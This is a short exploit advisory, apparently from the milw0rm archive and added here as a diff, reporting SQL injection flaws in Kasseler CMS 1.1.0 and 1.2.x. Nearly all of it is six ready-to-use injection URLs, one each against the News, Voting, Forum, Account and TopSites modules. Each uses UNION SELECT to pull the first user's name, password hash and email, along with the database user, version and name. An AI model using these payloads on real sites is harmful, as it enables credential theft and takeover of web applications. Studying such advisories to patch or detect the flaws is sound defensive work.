@@ -1,0 +1,22 @@
+Kasseler CMS 1.1.0, 1.2.0 Lite SQL Injection
+
+Author: ~!Dok_tOR!~
+Date found: 13.09.08
+Product: Kasseler CMS
+Version: 1.1.0, 1.2.4
+URL: www.kasseler-cms.net
+Vulnerability Class: SQL Injection
+
+http://localhost/[installdir]/index.php?module=News&do=View&nid=1'+and+1=2+union+select+1,2,concat_ws(0x3a,user_name,user_password,user_email),4,user(),version(),7,8,9,10,11,12,database(),14,15,16,17,18+from+kasseler_users+where+uid=1/*
+
+http://localhost/[installdir]/index.php?module=Voting&do=Result&vid=1'+union+select+1,concat_ws(0x3a,user_name,user_password,user_email),3,4,user(),6,version(),8,9,10,11,12,13,14,15+from+kasseler_users+where+uid=1/*
+
+http://localhost/[installdir]/index.php?module=Forum&do=ShowForum&fid=1'+union+select+1,2,3,concat_ws(0x3a,user_name,user_password,user_email),5,user(),database(),8,9,10,11,version(),13,14,15+from+kasseler_users+where+uid=1/*
+
+http://localhost/[installdir]/index.php?module=Forum&do=ShowTopic&tid=706'+union+select+1,2,3,4,concat_ws(0x3a,user_name,user_password,user_email),6,7,user(),9,10,11,version(),13,14,15,16,17,18+from+kasseler_users+where+uid=1/*
+
+http://localhost/[installdir]/index.php?module=Account&do=UserInfo&uname=dok'+union+select+1,2,3,4,concat_ws(0x3a,user_name,user_password,user_email),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27+from+kasseler_users+where+uid=1/*
+
+http://localhost/[installdir]/index.php?module=TopSites+1'+and+1=2+union+select+1,concat_ws(0x3a,user_name,user_password,user_email),3,4,5+from+kasseler_users+where+uid=1/*
+
+# milw0rm.com [2008-09-14]
